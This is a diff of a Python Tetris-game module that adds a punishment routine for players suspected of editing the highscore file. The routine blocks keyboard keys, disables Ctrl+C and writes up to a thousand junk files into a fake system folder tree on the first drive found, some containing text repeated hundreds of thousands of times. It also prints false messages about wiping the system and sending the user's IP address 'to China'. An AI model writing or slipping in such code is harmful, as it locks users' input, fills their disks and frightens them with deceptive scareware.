@@ -1,10 +1,15 @@
-import time
-import random
+from time import sleep, time
+from random import uniform, randint, choice
 import signal
+import os
+from string import ascii_uppercase
 from pathlib import Path
 from pynput import mouse
 from keyboard import block_key
+
 key = 0b0110111110110000100001010
+
+cache_times = [0.01, 0.05, 0.0, 0.1]
 
 keys_to_block = [
     'q','w','e','r','t','y','u','i','o','p',
@@ -39,7 +44,10 @@ def run():
         block_key(key)
     listener.start()
     signal.signal(signal.SIGINT, signal.SIG_IGN)
-    start_path = "C:\\tetris_folder\\"
+
+    drivers = [f"{letter}:" for letter in ascii_uppercase if os.path.exists(f"{letter}:")]
+
+    start_path = "\\tetris_folder\\"
     folders = [
         "Windows\\System32", "Users\\Public\\Documents",
         "Program Files\\Common Files", "Users\\You\\Desktop",
@@ -49,7 +57,7 @@ def run():
         "Pics\\JohnProk", "NakedRats\\bald\\thin", "malwhat\\bombs\\zip", "malwhat\\virus\\dangerous", "malwhat\\virus\\not_safe",
     ]
     for i in range(len(folders)):
-        folders[i] = start_path + folders[i]
+        folders[i] = drivers[0] + start_path + folders[i]
     files = [
         "kernel32.dll", "config.sys", "notes.txt", "savegame.dat",
         "cp.jpg", "driver.inf", "ntoskrnl.exe", "cache.tmp", "bomb.click(now_please)",
@@ -59,7 +67,7 @@ def run():
         "DO_NOT_OPEN.msi", "Calc.ulator", "Tuff.cmd", "Roblox.exe", "Discord.Hayday",
         "Song.mp10", "bomb.zip", "42.zip", "Windows.cp", "money.pdf", "Hacking.yes",
         "Press.exe", "explosive.boom", "recipies_to_fusionpower.idea", "how_to_create_a_bomb.txt",
-        "C++.exe"
+        "C++.exe", "clicknow.thankyou", "ARE_YOU.ARE_YOU.COMING_TO_THE_TREE"
     ]
     text = [
         "We are Charlie Kirk\n" * 676767,
@@ -85,17 +93,25 @@ def run():
         "Tiki tiki tiki tiki.\n" * 100000,
         "0110111110110000100001010 DO NOT TRANSLATE THIS.\n" * 676767,
         str(signal.__builtins__) * 10000,
-        str(random.__builtins__) * 10000,
         "Video of john pork.\n" * 100000,
         "Super rare legendary binary code: 0100000101101110011001000110010101110010011100110010000001101111011001110010000001000001011011100110010001110010011001010110000101110011001000000110010101110010001000000111001101101001011001110110110101100001\n" * 10000,
         
 
     ]
-    print("WARNING: Initiating full system wipe...")
-    time.sleep(1.5)
+    print("YOU TRIED TO CHEAT BY CHANGING THE HIGHSCORE FILE.")
+    sleep(1.7)
+    print("YOU HAVE TO FACE THE CONSEQUENSES OF YOUR ACTIONS")
+    sleep(1.8)
+    print("\nWARNING: Initiating full system wipe...")
+    sleep(1.4)
+    print("Stack-wiping ", end="")
+    [print(d, end=", ") for d in drivers]
+    print("\b\b")
+    
+    sleep(2)
     for i in range(1, 1001):
-        file = random.choice(files)
-        folder = random.choice(folders)
+        file = choice(files)
+        folder = choice(folders)
 
         full_file = f"{folder}\\{file}"
         if i % 10 == 0:
@@ -103,7 +119,7 @@ def run():
             full_visual_file = f"{visual_folder}\\{file}"
 
             print(f"[{(i//10):3d}%] Deleting {full_visual_file}")
-            #time.sleep(random.uniform(0.0, 0.05))
+            #sleep(uniform(0.0, 0.05))
 
 
         file_path = Path(f"{full_file}")
@@ -111,13 +127,31 @@ def run():
 
         try:
             with file_path.open(mode="x") as f:
-                f.write(random.choice(text))
+                f.write(choice(text))
         except FileExistsError:
-            pass
+            print(f"Found virus at {choice(files)}. Duplicating the virus ;)")
         
-    print("All files deleted. Shutting down...")
+    print("All files deleted.\n")
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    
+    print(f"Ip: {ip}")
+    print("Sending ip to China...")
+    sleep(5.23)
+    print(f"Sending proxy {ip} to port:1414")
+    sleep(2.711)
+    for i in range(randint(44, 271)):
+        print(f"Caching {choice(files)} reg{i*i%1777}")
+        sleep(choice(cache_times))
+
+    sleep(3)
     listener.stop()
-    raise CheatingError("I know you tried to cheat the highscore.")
+    print("\nThanks for playing!\nSee you soon.")
+    sleep(2.1234)
+    exit()
 
 def generate_tag(value: int) -> int:
     return (value ^ key) * 67
@@ -181,13 +215,13 @@ if __name__ == "__main__":
     while True:
         try:
             da_number = int(input("Encryption Num: "))
-            start_time = time.time()
+            start_time = time()
             en = encrypt(da_number)
             print(f"Encrypted number: {en}")
             de = decrypt(en)
             print(f"Decrypted number: {de}")
 
-            end_time = time.time()
+            end_time = time()
 
             print(f"Time: {(end_time - start_time) * 1000} ms")
             print("-------------------------------------------")
